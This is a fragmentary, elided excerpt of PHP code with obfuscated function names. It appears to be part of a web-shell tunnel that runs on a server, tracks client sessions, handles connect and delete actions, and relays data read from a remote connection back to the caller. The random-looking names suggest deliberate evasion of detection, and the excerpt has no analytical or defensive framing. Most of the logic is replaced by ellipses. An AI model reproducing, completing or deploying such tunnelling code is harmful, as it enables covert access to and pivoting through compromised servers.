...
function skMKbnCaJR($client_id, $data)
{
    $exist = false;
    session_start();
...
function skkjazZdtk()
{
    ...
    if ($action == 0x02) {
        skiqMXMnzz($client_id);
        return;
    } elseif ($action == 0x01) {
        $exist = skMKbnCaJR($client_id, $data_map['dt']);
        if (!$exist) {
            echo skXiJpMPol(new_del());
        }
        return;
    }
...
//        ignore_user_abort(true);
        ...
        skYhiTngKg($client_id);
        echo skXiJpMPol(new_status(0x00));
    } else {
        echo skXiJpMPol(new_status(0x01));
        return;
    }
    ...
    while (!feof($read_from)) {
        ...
        if (strlen($remote_data) !== 0) {
            echo skXiJpMPol(new_data($remote_data));
        }
